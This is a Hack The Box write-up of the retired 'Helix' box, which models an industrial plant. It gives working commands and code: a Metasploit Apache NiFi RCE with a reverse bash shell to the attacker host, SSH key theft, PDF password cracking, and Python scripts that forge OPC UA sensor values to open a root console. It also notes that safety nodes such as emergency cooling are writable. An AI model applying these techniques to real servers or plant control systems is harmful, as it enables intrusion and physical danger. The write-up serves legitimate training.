---
title: "Helix — HackTheBox Writeup"
date: 2026-09-20
author: "Angus Dawson"
tags: ["HTB","Linux","ICS","OT","OPC UA","Apache NiFi","Metasploit","SSH","john","Safety Instrumented System","CWE-807","Privilege Escalation"]
categories: ["CTF Writeups"]
difficulty: "Medium"
platform: "Hack The Box"
os: "Linux"
featured: true
featured_weight: 1
summary: "A Linux box modelling an industrial plant, where the privilege escalation is not a CVE but the plant's own safety logic being fed a forged sensor reading. Unauthenticated Apache NiFi → operator SSH key in support-bundles → password-cracked PLC manual → anonymous OPC UA writes → CalibrationOffset ramped into the maintenance window → helix-maint-console → root."
images: ["/images/helix/helix.png"]
cover:
  image: "/images/helix/helix.png"
  alt: "Helix HTB image"
  caption: "Helix - CTF - Hack The Box"
  relative: true
  hidden: false

---

> **Spoiler warning**: This writeup documents my playthrough of the retired Hack The Box machine **Helix**.

The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.

## Overview
- **Platform:** Hack The Box (retired)
- **Target OS:** Ubuntu 22.04.5 LTS — an OT/ICS simulation fronting a nuclear plant HMI, an OPC UA server and a safety controller
- **Focus:** vhost discovery → unauthenticated Apache NiFi processor RCE → SSH private key recovered from a leftover support bundle → offline PDF password cracking → OPC UA address-space enumeration → process-variable spoofing to satisfy an authorisation check → root
- **Difficulty:** Medium

---

## Recon

`helix.htb` goes into `/etc/hosts` first — every command from here on uses the name rather than the IP:

```bash
echo "10.129.9.96 helix.htb" | sudo tee -a /etc/hosts
```

Initial scan. Note that it takes the bare IP and the report still resolves the name; that is the hosts entry, not a PTR record:

```bash
nmap -sC -sV 10.129.9.96 -oN nmap-scan
```

**Result highlights (relevant lines)**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Helix Industries | Industrial Automation & Critical Infrastruc ...
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports, which is a small attack surface and a strong hint that the web service is the whole game. The `Service Info` line is nmap's service-derived guess rather than an OS fingerprint — no `-O` was run — but the OpenSSH banner pins it to Ubuntu regardless.

![Nmap service scan against Helix](/images/helix/nmap_scan.png)

Port 80 is a corporate brochure site for "Helix Industries", an industrial automation contractor. There is nothing exploitable on it, but the theme matters: everything later in the box is dressed as plant equipment.

![The Helix Industries corporate site on port 80](/images/helix/helix.htb.png)

With a single vhost answering on 80 and nothing else exposed, the next move is to fuzz the `Host` header. The default response is 154 bytes, so filter on that size:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 154 -u http://helix.htb:80/ -H 'Host: FUZZ.helix.htb'
```

One name survives the filter out of 4,989 candidates:

```text
flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 451ms]
```

![ffuf discovering the flow vhost](/images/helix/ffuf_output.png)

`flow` is a telling name — it is what Apache NiFi calls its pipelines. Add the vhost so the browser and Metasploit both reach it:

```bash
echo "10.129.9.96 flow.helix.htb" | sudo tee -a /etc/hosts
```

![Adding the flow vhost to /etc/hosts](/images/helix/add_host.png)

---

## Foothold: an unauthenticated NiFi canvas

`flow.helix.htb/nifi/` loads the NiFi flow canvas directly. No login page, no user in the toolbar — the application treats the browser as a fully privileged anonymous caller. Two processors sit on the canvas, `ExecuteSQL` feeding `LogAttribute` over a `success` connection, both stamped `1.21.0` from `org.apache.nifi - nifi-standard-nar`.

![The unauthenticated Apache NiFi canvas at flow.helix.htb](/images/helix/apache_nifi.png)

**Why this is remote code execution.** NiFi is a dataflow platform built out of *processors* — small configurable units wired together on a canvas and driven by a REST API under `/nifi-api`. Several standard processors run operating-system commands as their entire purpose: `ExecuteProcess` launches a command, `ExecuteStreamCommand` pipes content through one, `ExecuteScript` runs a script in an embedded engine. That is a documented feature, and Apache is explicit that configuring dangerous OS commands is not a project security vulnerability. NiFi's whole security boundary is therefore the authentication layer in front of the canvas — and that layer is tied to transport security. Served over HTTPS, NiFi enforces authentication and authorisation. Served over plain HTTP with no access control, as here, anyone who can reach `/nifi-api` can create a processor, point it at a command, and start it. No software defect is exploited at all; an intended feature is simply exposed to the internet.

Worth noting what we are *not* doing: NiFi 1.21.0 falls inside the affected range of two real vulnerabilities, **CVE-2023-34468** (H2 JDBC connection-URL RCE via `DBCPConnectionPool`) and **CVE-2023-34212** (JNDI deserialisation in the JMS components), both fixed in 1.22.0. Neither is needed. The misconfiguration path is open.

Metasploit automates the processor dance. The module defaults to `RPORT 8080` and appends `nifi-api` to the base path itself, so only the port has to be corrected and the vhost set explicitly — nginx is routing by `Host` header:

```bash
msfconsole
```

```text
msf6 > use exploit/multi/http/apache_nifi_processor_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/apache_nifi_processor_rce) > set VHOST flow.helix.htb
msf6 exploit(multi/http/apache_nifi_processor_rce) > set RPORT 80
msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOSTS 10.129.9.96
```

The `cmd/unix/reverse_bash` line is Metasploit's own notice on `use`, not something we set — it is the module's configured default. `TARGETURI` is left alone for the same reason: it defaults to `/`, and the module appends `nifi-api` itself when it builds each API call, so pointing it at the API path would request `/nifi-api/nifi-api/processors` and 404.

![Selecting the NiFi processor RCE module and setting the target](/images/helix/msfconsole.png)

Set the callback and run:

```text
msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST 10.10.14.98
msf6 exploit(multi/http/apache_nifi_processor_rce) > set LPORT 9999
msf6 exploit(multi/http/apache_nifi_processor_rce) > run
[*] Started reverse TCP handler on 10.10.14.98:9999
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Apache NiFi instance does not support logins
[*] Command shell session 1 opened (10.10.14.98:9999 -> 10.129.9.96:47338)
[*] Waiting 5 seconds before stopping and deleting
[+] Processor Stop sent successfully
[+] Processor Delete sent successfully
```

The `could not be validated` warning is the confirmation, not a problem. The check never attempts a login — it asks the instance whether it supports one, and this one says no, which Metasploit renders as "running, but unverified". It hedges because it cannot confirm `ExecuteProcess` is actually available without creating a processor, which is what `run` is about to do anyway. The module then creates that processor via the API, starts it to fire the payload, and stops and deletes it afterwards. That tidies the canvas rather than the evidence — the flow-configuration history records the processor being added, configured, started and deleted, and `nifi-app.log` records the scheduling either side of it.

![Metasploit landing a shell and cleaning up the processor](/images/helix/msfconsole2.png)

The session lands as the service account, in the NiFi install directory:

```text
whoami
nifi
nifi@helix:/opt/nifi-1.21.0$ pwd
/opt/nifi-1.21.0
```

![Command shell as the nifi service account](/images/helix/nifi_shell.png)

---

## nifi → operator: a key left in a support bundle

The shell lands in the install directory, so the first move is to look at what is in it. Most of it is the stock NiFi tree — `bin`, `conf`, `lib`, the repositories — and one directory that ships with no NiFi release: `support-bundles/`. NiFi has a diagnostics command, but it writes to a file you name; it does not stage anything here. Someone made this directory by hand, which is reason enough to open it:

```bash
ls -l /opt/nifi-1.21.0/support-bundles/
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

```text
-rw-r----- 1 nifi nifi 411 Jan 25  2026 operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

411 bytes and owned by `nifi` — the service account we already control can read it, and the filename names its owner. Material staged for a vendor ticket is exactly the kind of artefact that gets generated under pressure, attached to an email, and never cleaned up.

![The operator private key staged in NiFi's support-bundles directory](/images/helix/ssh_key.png)

Save it locally, `chmod 600`, and use it:

```bash
ssh -i operator_id_ed25519 operator@helix.htb
```

```text
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)
operator@helix:~$
```

![SSH session as operator using the recovered key](/images/helix/operator-shell.png)

The user flag is in the home directory:

```interactive shell
operator@helix:~$ cat /home/operator/user.txt
```

`e69d8859993cc0263f10c15cac077d29`

![User flag read from the operator home directory](/images/helix/user_flag.png)

---

## The operator's documents

`operator`'s home holds two files that are clearly meant to be read rather than executed:

```bash
ls -l
```

```text
-rw------- 1 operator operator 920611 Jan 26  2026 'control systems diagram.png'
-rw-rw-r-- 1 operator operator  28453 Apr 16 08:50 'Operator Control & Safety Guide.pdf'
-rw-r----- 1 root     operator     33 Sep 19 01:28  user.txt
```

![The operator home directory holding the plant documentation](/images/helix/privile_escalation.png)

Pull both down. The filenames contain spaces and an ampersand, so the remote paths need escaping — the PDF first, then the diagram:

```bash
scp -i operator_id_ed25519 \
  operator@helix.htb:/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf .

scp -i operator_id_ed25519 \
  operator@helix.htb:/home/operator/control\ systems\ diagram.png .
```

![Transferring the plant documentation off the target with scp](/images/helix/scp.png)

The diagram is the map of everything that follows. An OPC UA server at `opc.tcp://127.0.0.1:4840/helix/` sits between an operator station, a remote client, and three subsystems. The colour coding is load-bearing: **Reactor Systems** in blue, **Control Systems** in green, **Safety Systems** in red, with a pencil icon on every writable point and a padlock on every read-only one. Per the vendor's own drawing, `Calibration Offset`, `Mode`, `Test Override` and `Reset Trip` are writable; `Trip Active`, `Rods Inserted` and `Emergency Cooling` are not.

Note the address. `127.0.0.1` means the OPC UA server is loopback-only — it is not reachable from the VPN, and everything we do to it has to run on the box or through a tunnel. The operator foothold is a prerequisite, not a convenience.

![The vendor's control systems diagram, with every point marked writable or read-only](/images/helix/control_systems_diagram.png)

The PDF is password protected:

![The Operator Control & Safety Guide refusing to open without a password](/images/helix/pdf_pw_protected.png)

PDF encryption reduces to a key derived from the user password, so the document itself carries everything an offline attack needs. `pdf2john` extracts that material into a hash john can chew on:

```bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

![Extracting the PDF hash and running it against rockyou](/images/helix/pdf2john.png)

rockyou has it. `john --show` reads the answer back out of the pot file:

```bash
john --show pdf.hash
```

```text
Operator Control & Safety Guide.pdf:operator1

1 password hash cracked, 0 left
```

The password is `operator1` — an operator account with the word "operator" and a digit, which is depressingly true to life.

![john revealing the cracked PDF password](/images/helix/pdf2john-password.png)

---

## Reading the PLC specification

The decrypted guide reads like an exploit written out in advance by the vendor. Six sections matter.

**Section 3 — Normal Operating Mode.** In `NORMAL`, `CalibrationOffset` is expected to be `0.0` and `TestOverride` must be disabled. Any attempt to apply calibration offsets or overrides in `NORMAL` mode is ignored by the PLC. So writing the offset first and flipping the mode later achieves nothing; order is prescriptive.

![Section 3 of the guide defining NORMAL mode behaviour](/images/helix/operating_mode.png)

**Section 4 — Safety Trip Logic.** Under the sub-heading *Trip Thresholds (Internal)*, a trip fires at temperature ≥ ~305 °C or pressure ≥ ~75 bar. On trip, `TripActive` becomes `TRUE`, control logic is locked, safety systems take precedence, and operator inputs are restricted. The trip is **latched** and cannot be cleared immediately.

![Section 4 of the guide listing the internal trip thresholds](/images/helix/safety_trip_logic.png)

**Section 5 — Trip Reset Conditions.** A reset requires *all* of: temperature below ~288 °C, pressure below ~70 bar, mode `NORMAL`, `TestOverride` disabled, and `CalibrationOffset` back to `0.0`. Only when the system is back in a verified safe state will a `ResetTrip` request be honoured — which, as the document says, is what stops operators bypassing safety systems while unsafe conditions persist.

![Section 5 of the guide defining the trip reset conditions](/images/helix/trip_reset_conditions.png)

**Section 6 — Maintenance Mode & Safety Window.** An ordered, three-step procedure: switch `Mode` to `MAINTENANCE`, enable `TestOverride`, then begin controlled adjustment using `CalibrationOffset`. Crucially, the section closes by noting the reactor is *still* protected by safety logic in this mode — `MAINTENANCE` permits limited overrides for diagnostics, it does not disable the trip.

![Section 6 of the guide describing how to enter maintenance mode](/images/helix/maintenance_window.png)

**Section 7 — Maintenance Operating Window.** A *maintenance operating window* opens when temperature reaches approximately 295 °C or pressure 73 bar, while both remain below the trip thresholds and no safety trip is active. The window exists **below** trip limits but **above** normal operating conditions, and is deliberately narrow so that maintenance actions stay time-limited and closely monitored.

![Section 7 of the guide defining the maintenance operating window](/images/helix/maintenance_window2.png)

**Section 8 — Behavior During CalibrationOffset Ramp.** Increase the offset gradually and temperature rises predictably while pressure stays tightly constrained. Increase it too aggressively and the PLC trips, after which calibration changes are ignored outright.

![Section 8 of the guide describing the calibration offset ramp](/images/helix/callibration_offset.png)

Sections 4, 6 and 7 are the three that fix the target band: get into `MAINTENANCE` with `TestOverride` on, then land the temperature somewhere between roughly 295 °C and 305 °C. Ten degrees wide, with a latched trip on the far side.

---

## Internal services

The guide describes an OPC UA server and an HMI. Both are listening, and neither is exposed:

```bash
ss -tnlp
```

```text
State   Recv-Q  Send-Q       Local Address:Port      Peer Address:Port  Process
LISTEN  0       100               127.0.0.1:4840              0.0.0.0:*
LISTEN  0       50                127.0.0.1:37083             0.0.0.0:*
LISTEN  0       50                127.0.0.1:8080              0.0.0.0:*
LISTEN  0       128               127.0.0.1:8081              0.0.0.0:*
LISTEN  0       4096          127.0.0.53%lo:53                0.0.0.0:*
LISTEN  0       128                 0.0.0.0:22                0.0.0.0:*
LISTEN  0       511                 0.0.0.0:80                0.0.0.0:*
LISTEN  0       50       [::ffff:127.0.0.1]:40769                  *:*
LISTEN  0       128                    [::]:22                  [::]:*
```

`4840` is the OPC UA default. `8081` is something else. The rest is ordinary background — systemd-resolved's stub listener, an ephemeral port, and the IPv6 twin of `22`. Only `22` and `80` bind a non-loopback address, which is exactly what the scan saw from outside. Note also that `-p` produced an empty Process column for every row: as an unprivileged user we can see the sockets but not who owns them.

![Enumerating loopback listeners as operator](/images/helix/internal_network.png)

```bash
curl 127.0.0.1:8081
```

```text
<!doctype html><html><head>
<title>Helix HMI — Reactor Panel</title>
```

![Confirming the HMI on loopback port 8081](/images/helix/verify_curl.png)

Forward it out so the dashboard is readable in a browser:

```bash
ssh -i operator_id_ed25519 -L 8081:127.0.0.1:8081 operator@helix.htb
```

![Forwarding the HMI to the attacker host over SSH](/images/helix/port_fwd.png)

The dashboard at `http://127.0.0.1:8081/` is the live state of everything the guide described, and it opens with a warning:

> Maintenance window is NOT the same as MAINTENANCE mode. Window opens only when safety controller authorizes it under hazardous test conditions.

Reactor reads `279.0 °C` and `68.75 bar`, with `Raw Temp: 279.0 °C | CalibrationOffset: 0.0 °C` broken out separately underneath. Control shows `Mode: NORMAL`, `Test Override: False`. The **Privileged Maintenance Window** panel reads `Status: CLOSED`, and spells out the gate: granted by the safety controller only when a hazardous test condition is detected, *e.g.* Temp ≥ 295 °C or Pressure ≥ 73 bar, while still below trip.

That the HMI exposes raw temperature and calibration offset as two separate values is the tell. Displayed temperature is raw plus offset, and the offset is writable.

![The Helix reactor HMI with the maintenance window closed](/images/helix/reactor_dashboard.png)

---

## The sudo rule

```bash
sudo -l
```

```text
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:..., use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

One NOPASSWD rule with no argument restriction. The `Defaults` line closes the usual side doors — `env_reset` and a fixed `secure_path` kill environment and `PATH` manipulation, `use_pty` blocks a class of TTY tricks. There is no shortcut here; the binary is the intended route.

![The sudo rule granting operator access to helix-maint-console](/images/helix/sudo_permissions.png)

Running it does nothing at all:

```bash
sudo /usr/local/sbin/helix-maint-console
```

```text
Maintenance window CLOSED.
```

![helix-maint-console refusing to run while the window is shut](/images/helix/maint-console_closed.png)

**Why this works.** Here is the whole box in one sentence: a binary that grants root checks, at invocation time, whether the plant is in a hazardous test condition — and the value it checks is one we can write. `helix-maint-console` asks the safety controller whether the window is open. The safety controller answers by reading the reported temperature. The reported temperature is raw temperature plus `CalibrationOffset`. And `CalibrationOffset` is a writable OPC UA node on a server that accepts anonymous sessions. Nothing physical has to change: we are not heating a reactor, we are forging the sensor reading that the authorisation decision consumes. That is **CWE-807, Reliance on Untrusted Inputs in a Security Decision** — the same class as trusting a cookie or a client-supplied role claim, wearing a lab coat.

---

## OPC UA: mapping the address space

An OPC UA server exposes an *address space*: a graph of nodes, where Object nodes give structure and Variable nodes hold values. Browsing it from the `Objects` folder downward is how you find out what a plant actually exposes — ATT&CK for ICS tracks the behaviour as **T0861, Point & Tag Identification**.

The server is loopback-only, so the scripts get written locally and dropped into `/tmp` on the target. First, find the `Plant` object and list its children:

```python
import asyncio
from asyncua import Client

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def main():
    async with Client(URL) as c:
        objs = await c.nodes.objects.get_children()

        plant = None
        for n in objs:
            bn = await n.read_browse_name()
            if bn.Name == "Plant":
                plant = n
                break

        if not plant:
            print("[!] 'Plant' not found under Objects")
            return

        print(f"[+] Found Plant: {plant.nodeid}\n")
        for ch in await plant.get_children():
            bn = await ch.read_browse_name()
            print(f"Plant.{bn.Name} → {ch.nodeid}")

asyncio.run(main())
```

![The plant_enum.py address-space enumeration script](/images/helix/plant_enum_python.png)

Note that `Client(URL)` is passed no security policy and no user token. asyncua defaults to `SecurityPolicy None` and an `Anonymous` identity token unless `set_security()` and `set_user()` are called — and the connection succeeds, which tells us the server offers both. Those are two independent failures: an unencrypted, unsigned channel, *and* no user authentication.

```text
operator@helix:/tmp$ python3 plant_enum.py
[+] Found Plant: NodeId(Identifier=1, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)

Plant.Reactor → NodeId(Identifier=2, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)
Plant.Safety → NodeId(Identifier=7, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)
Plant.Control → NodeId(Identifier=11, NamespaceIndex=2, NodeIdType=<NodeIdType.FourByte: 1>)
```

![plant_enum.py returning the three plant subsystems](/images/helix/plant_enum_out.png)

Structure matches the diagram. The more useful question is what this *session* may write.

Every Variable node carries an `AccessLevel` attribute and a `UserAccessLevel` attribute, both a byte of option bits: bit 0 (mask `0x01`) is CurrentRead, bit 1 (mask `0x02`) is CurrentWrite. `AccessLevel` describes what the node supports in the abstract; `UserAccessLevel` describes the same thing with the connected session's rights applied. It can restrict what `AccessLevel` permits but never exceed it — so testing bit 1 of `UserAccessLevel` is how you ask "what can *I* change", as opposed to what the node advertises:

```python
# plant_write_enum.py
import asyncio

from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def writable(node):
    try:
        ual = await node.read_attribute(ua.AttributeIds.UserAccessLevel)
        bits = int(ual.Value.Value)
    except Exception:
        al = await node.read_attribute(ua.AttributeIds.AccessLevel)
        bits = int(al.Value.Value)
    return bool(bits & 0x02)  # write bit

async def walk(node, path):
    try:
        kids = await node.get_children()
    except Exception:
        return

    for k in kids:
        try:
            name = (await k.read_browse_name()).Name
        except Exception:
            name = str(k.nodeid)

        new_path = f"{path}.{name}"
        try:
            nc = await k.read_node_class()
        except Exception:
            nc = None

        if nc == ua.NodeClass.Variable:
            try:
                if await writable(k):
                    print(f"[W] {new_path} → {k.nodeid}")
            except Exception:
                pass

        await walk(k, new_path)

async def main():
    async with Client(URL) as c:
        await walk(c.nodes.objects, "Objects")

asyncio.run(main())
```

![The writable-node enumeration logic in plant_write_enum.py](/images/helix/plant_write_python.png)

![The recursive walk and entry point of plant_write_enum.py](/images/helix/plant_write_python2.png)

```text
operator@helix:/tmp$ python3 plant_write_enum.py
[W] Objects.Plant.Reactor.CalibrationOffset → NodeId(Identifier=6, ...)
[W] Objects.Plant.Safety.RodsInserted → NodeId(Identifier=8, ...)
[W] Objects.Plant.Safety.EmergencyCooling → NodeId(Identifier=9, ...)
[W] Objects.Plant.Control.Mode → NodeId(Identifier=12, ...)
[W] Objects.Plant.Control.TestOverride → NodeId(Identifier=13, ...)
[W] Objects.Plant.Control.ResetTrip → NodeId(Identifier=14, ...)
```

![plant_write_enum.py listing every node the operator session can write](/images/helix/plant_write_out.png)

Two things stand out.

First, the identifier gaps. Printed nodes are 6, 8, 9, 12, 13, 14; nothing is reported for 3, 4, 5 or 10. `Temperature`, `Pressure` and `TripActive` are in that gap — so the server genuinely *does* enforce read-only on some nodes. This is not a server that grants write to everything.

Second, and precisely because of that: **`Safety.RodsInserted` and `Safety.EmergencyCooling` are writable**, and the vendor diagram labels both read-only with a padlock. The documented security model and the deployed ACLs disagree. We do not need those nodes to solve the box, but an attacker who wanted to cause harm rather than escalate privilege would use them — the ability to write the state of emergency cooling is materially worse than the ability to get a root shell.

One caveat the code invites: `writable()` falls back to `AccessLevel` on *any* exception, so a node with a null `UserAccessLevel` would be judged on the server-wide value instead of this session's. The spec says as much — clients should not assume access from the attribute alone, since a write can still be refused with `BadUserAccessDenied`. Attribute enumeration produces candidates; the write attempt is the proof.

---

## First attempt: the ramp that trips

The guide's procedure is three steps, so start with the first two:

```python
import asyncio
from asyncua import Client

async def main():
    async with Client(url="opc.tcp://127.0.0.1:4840/helix/") as c:
        mode = await c.nodes.objects.get_child(["2:Plant","2:Control","2:Mode"])
        ov   = await c.nodes.objects.get_child(["2:Plant","2:Control","2:TestOverride"])
        await mode.write_value("MAINTENANCE")
        await ov.write_value(True)

asyncio.run(main())
```

![enable_test_override.py arming maintenance mode](/images/helix/enable_test_override_script.png)

Then ramp the offset a degree at a time, watching for a trip:

```python
# caloffset.py
import asyncio
from asyncua import Client

URL = "opc.tcp://127.0.0.1:4840/helix/"

CAL   = "ns=2;i=6"   # CalibrationOffset
TEMP  = "ns=2;i=4"   # Temperature
PRESS = "ns=2;i=5"   # Pressure
TRIP  = "ns=2;i=10"  # TripActive

async def main():
    async with Client(URL) as c:
        cal   = c.get_node(CAL)
        temp  = c.get_node(TEMP)
        press = c.get_node(PRESS)
        trip  = c.get_node(TRIP)

        for _ in range(50):
            off = float(await cal.read_value())
            await cal.write_value(off + 1.0)
            await asyncio.sleep(1)
            t  = float(await temp.read_value())
            p  = float(await press.read_value())
            tr = bool(await trip.read_value())

            print(f"offset={off+1:.2f} temp={t:.2f}C press={p:.2f}bar trip={tr}")

            if tr:
                print("[!] TRIP hit, stopping")
                break

asyncio.run(main())
```

![The naive caloffset.py ramp script](/images/helix/caloffset_script.png)

It climbs steadily and then falls off the cliff:

```text
offset=19.00 temp=303.28C press=69.20bar trip=False
offset=20.00 temp=304.27C press=69.20bar trip=False
offset=21.00 temp=305.27C press=69.19bar trip=True
[!] TRIP hit, stopping
```

![caloffset.py latching the safety trip at 305.27 °C](/images/helix/caloffset_out.png)

Three observations.

The loop *does* read `TripActive` every iteration — it is not blind. Its defect is that the only stopping rule fires after the trip has already latched. It detects the failure instead of avoiding it. What it never checks is whether it has already climbed far enough, so it sails straight through the 295 °C window at offset 11 and keeps going for another ten steps.

Pressure barely moves. It sits around 69.2 bar for the entire ramp and never approaches either the 73 bar window threshold or the 75 bar trip. The window's "or pressure 73 bar" clause is decorative on this box — temperature is the only variable that matters.

And the trip is now latched. `CalibrationOffset` writes are ignored while `TripActive` is true, and it will not clear while the conditions that caused it persist. Per section 5, recovery means driving the whole system back to a verified safe state first.

---

## The working exploit

`exploit.py` fixes the stopping rule and adds a recovery path so the box is retryable after a trip:

```python
# exploit.py
import asyncio
import time

from asyncua import Client

ENDPOINT = "opc.tcp://127.0.0.1:4840/helix/"
OPEN_WINDOW_TEMP = 295.0
OPEN_WINDOW_PRESS = 73.0
TRIP_TEMP = 305.0
TRIP_PRESS = 75.0
SAFE_TEMP = 288.0
SAFE_PRESS = 70.0


async def find(parent, name):
    for ch in await parent.get_children():
        bn = await ch.read_browse_name()
        if bn.Name == name:
            return ch
    raise Exception(f"Missing node: {name}")


async def read_vals(temp, press, trip, mode, ov, cal):
    return (
        float(await temp.read_value()),
        float(await press.read_value()),
        bool(await trip.read_value()),
        await mode.read_value(),
        bool(await ov.read_value()),
        float(await cal.read_value()),
    )


async def main():
    async with Client(url=ENDPOINT) as c:
        plant = await find(c.nodes.objects, "Plant")
        reactor = await find(plant, "Reactor")
        control = await find(plant, "Control")
        safety = await find(plant, "Safety")
        mode = await find(control, "Mode")
        ov = await find(control, "TestOverride")
        reset_trip = await find(control, "ResetTrip")
        cal = await find(reactor, "CalibrationOffset")
        temp = await find(reactor, "Temperature")
        press = await find(reactor, "Pressure")
        trip = await find(safety, "TripActive")

        # ---- status ----
        t, p, tr, m, o, off = await read_vals(temp, press, trip, mode, ov, cal)
        print(
            f"[*] Current: temp={t:.2f}C press={p:.2f}bar trip={tr} "
            f"mode={m} override={o} offset={off:.2f}"
        )

        # ---- if tripped, reset cleanly ----
        if tr:
            print("[!] Trip is latched. Resetting to safe baseline...")
            await ov.write_value(False)
            await mode.write_value("NORMAL")
            await cal.write_value(0.0)
            await reset_trip.write_value(True)
            deadline = time.time() + 45
            while time.time() < deadline:
                t, p, tr, m, o, off = await read_vals(temp, press, trip, mode, ov, cal)
                print(
                    f"    temp={t:.2f}C press={p:.2f}bar trip={tr} "
                    f"mode={m} override={o} offset={off:.2f}"
                )
                if (not tr) and (t <= SAFE_TEMP) and (p <= SAFE_PRESS) and (m == "NORMAL"):
                    print("[+] Trip cleared and system is safe.")
                    break
                await asyncio.sleep(1)
            t, p, tr, m, o, off = await read_vals(temp, press, trip, mode, ov, cal)
            if tr:
                print("[!] Trip still TRUE. Leave it longer or wait for the 5-minute service reset.")
                return

        # ---- arm the vulnerable condition ----
        print("[*] Switching to MAINTENANCE + TestOverride...")
        await mode.write_value("MAINTENANCE")
        await ov.write_value(True)
        await cal.write_value(0.0)

        # ---- ramp offset slowly to open window but not trip ----
        print(
            "[*] Ramping CalibrationOffset toward the window (~295C/~73bar) "
            "without tripping (~305C/~75bar)..."
        )
        for step in [1.0] * 50:
            off = float(await cal.read_value())
            await cal.write_value(off + step)
            t, p, tr, m, o, off2 = await read_vals(temp, press, trip, mode, ov, cal)
            print(f"    offset={off2:.2f}  temp={t:.2f}C  press={p:.2f}bar  trip={tr}")
            if tr or t >= TRIP_TEMP or p >= TRIP_PRESS:
                await cal.write_value(max(-30.0, off2 - 3.0))
                print("[!] Too close / TRIP. Backed off.")
                return
            if (t >= OPEN_WINDOW_TEMP or p >= OPEN_WINDOW_PRESS) and not tr:
                print("[+] Window condition reached. Run NOW:")
                print("    sudo /usr/local/sbin/helix-maint-console")
                return
            await asyncio.sleep(1)

        print("[!] Didn't reach window within ramp. Wait a moment (MAINTENANCE drifts up) then rerun.")


if __name__ == "__main__":
    asyncio.run(main())
```

![The constants and helper functions of exploit.py](/images/helix/exploit_python1.png)

![The status read and trip-recovery block of exploit.py](/images/helix/exploit_python2.png)

Four differences from the naive version, in order of importance.

It checks the **window** condition after every step, not just the trip condition — `t >= OPEN_WINDOW_TEMP` stops the ramp the moment the door opens. It also carries a pre-emptive guard at `TRIP_TEMP` that backs the offset off by 3.0 rather than latching. If a previous run already latched the trip, it drives the system back to the section 5 safe state first — override off, mode `NORMAL`, offset `0.0`, then `ResetTrip` — and polls for up to 45 seconds until `TripActive` clears before ramping again. And it resolves nodes by browse name through `find()` instead of hardcoding `ns=2;i=N`, which is worth doing because node identifiers are a server implementation detail while browse names come from the vendor's own documentation.

One string in that recovery block is a hedge rather than an observation: the run below never fell through to the `Trip still TRUE` branch, so I cannot confirm the five-minute service reset it mentions. If the 45-second poll does not clear the latch, the dependable move is to reset the machine from the HTB panel — section 5's conditions are the only clearing mechanism the guide actually documents.

Note the starting state in the run below, too. The latch had already cleared and the plant was back at `NORMAL` with a zero offset before this run began, so the recovery branch is skipped entirely. It earns its place on the runs where that is not true.

Run it:

```bash
python3 exploit.py
```

```text
[*] Current: temp=283.21C press=68.94bar trip=False mode=NORMAL override=False offset=0.00
[*] Switching to MAINTENANCE + TestOverride...
[*] Ramping CalibrationOffset toward the window (~295C/~73bar) without tripping (~305C/~75bar)...
    offset=1.00   temp=283.21C  press=68.94bar  trip=False
    ...
    offset=12.00  temp=294.81C  press=69.10bar  trip=False
    offset=13.00  temp=295.85C  press=69.10bar  trip=False
[+] Window condition reached. Run NOW:
    sudo /usr/local/sbin/helix-maint-console
```

![exploit.py ramping into the maintenance window without tripping](/images/helix/exploit_out.png)

Offset 13 rather than 21, and the trip never fires. Note that 13 is **not** a reproducible magic number: the failed run started at 285.31 °C for offset 1 and this one at 283.21 °C, so the same offset lands on a different temperature each time. The loop has to read the measured value back every iteration and decide on that — aiming at a fixed offset will either stop short or overshoot into the trip.

---

## Root via helix-maint-console

The window is open and the clock is running:

```bash
sudo /usr/local/sbin/helix-maint-console
```

```text
[+] Privileged maintenance access granted
[!] Window expires in 82 seconds
[!] Session will be terminated automatically
root@helix:/tmp#
```

Eighty-two seconds is enough but not generous, and the shell opens in `/tmp` — so use the absolute path rather than discovering mid-countdown that `root/root.txt` is relative:

```interactive shell
root@helix:/tmp# cat /root/root.txt
```

`39771fb9dd2191a533dc10e84fd49432`

![Root shell granted by helix-maint-console and the root flag](/images/helix/root_access.png)

---

## Takeaways

- **An unauthenticated NiFi canvas is instant code execution as the service account.** `ExecuteProcess` and its siblings run OS commands by design, and NiFi only enforces authentication when served over HTTPS — so an HTTP deployment with no access control hands every anonymous caller a shell. There is no patch for this because there is no bug. Terminate NiFi behind TLS with authentication enabled, and treat any `/nifi-api` reachable without credentials as already compromised.
- **Support bundles are credential dumps.** `operator_id_ed25519.bak` sat in `support-bundles/` readable by the service account, and a private key in a diagnostic directory is a key in production. Audit the staging directories of every application that can generate a support archive, and rotate anything that has ever been attached to a vendor ticket.
- **Document encryption is an offline problem.** A password-protected PDF carries its own verifier, so the moment the file leaves the host the password is a hashcat or john target rather than an access control. `operator1` fell to rockyou instantly. Classify documents that describe safety logic as secrets and protect them with access control, not a passphrase.
